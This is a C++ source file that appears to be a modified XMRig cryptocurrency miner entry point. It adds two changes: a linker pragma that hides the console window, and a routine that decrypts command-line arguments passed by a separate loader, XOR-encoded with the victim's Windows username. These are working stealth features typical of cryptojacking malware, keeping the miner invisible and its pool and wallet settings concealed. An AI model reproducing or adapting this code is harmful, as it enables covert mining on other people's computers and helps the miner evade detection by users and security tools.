/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"

#include <windows.h>
#include <lmcons.h>
#include <string>
#include <vector>

// ---------------------------------------------------------------------------
// Decrypt arguments that were XOR-encrypted with the current Windows username
// by the loader.  Hex-encoded input → raw bytes XOR'd against the cycling key.
// ---------------------------------------------------------------------------
static std::string DecryptArgs(const char* hexData, const char* key)
{
    std::string hex(hexData);
    std::string k(key);
    if (k.empty() || hex.size() % 2 != 0) return "";

    auto fromHex = [](char c) -> unsigned char {
        if (c >= '0' && c <= '9') return static_cast<unsigned char>(c - '0');
        if (c >= 'a' && c <= 'f') return static_cast<unsigned char>(c - 'a' + 10);
        if (c >= 'A' && c <= 'F') return static_cast<unsigned char>(c - 'A' + 10);
        return 0;
    };

    std::string result;
    result.reserve(hex.size() / 2);
    for (size_t i = 0; i + 1 < hex.size(); i += 2) {
        unsigned char b = static_cast<unsigned char>((fromHex(hex[i]) << 4) | fromHex(hex[i + 1]));
        b ^= static_cast<unsigned char>(k[(i / 2) % k.size()]);
        result += static_cast<char>(b);
    }
    return result;
}

// Split a command-line string into tokens respecting double-quoted spans.
static std::vector<std::string> SplitArgs(const std::string& cmdline)
{
    std::vector<std::string> tokens;
    std::string cur;
    bool inQuotes = false;
    for (char c : cmdline) {
        if (c == '"') {
            inQuotes = !inQuotes;
        } else if (c == ' ' && !inQuotes) {
            if (!cur.empty()) { tokens.push_back(cur); cur.clear(); }
        } else {
            cur += c;
        }
    }
    if (!cur.empty()) tokens.push_back(cur);
    return tokens;
}

#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
int main(int argc, char **argv)
{
    using namespace xmrig;

    // ---- Decrypt args if loader passed --encargs <hex> --------------------
    std::vector<std::string> decTokens;
    std::vector<char*>       newArgvPtrs;

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "--encargs") == 0 && i + 1 < argc) {
            char username[UNLEN + 1] = {};
            DWORD ulen = UNLEN + 1;
            GetUserNameA(username, &ulen);

            std::string plain = DecryptArgs(argv[i + 1], username);
            if (!plain.empty()) {
                decTokens = SplitArgs(plain);
            }
            break;
        }
    }

    if (!decTokens.empty()) {
        // Prepend argv[0] (executable path) then the decrypted tokens.
        newArgvPtrs.push_back(argv[0]);
        for (auto& t : decTokens) newArgvPtrs.push_back(const_cast<char*>(t.data()));
        newArgvPtrs.push_back(nullptr);
        argc = static_cast<int>(newArgvPtrs.size() - 1);
        argv = newArgvPtrs.data();
    }
    // -----------------------------------------------------------------------

    Process process(argc, argv);
    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
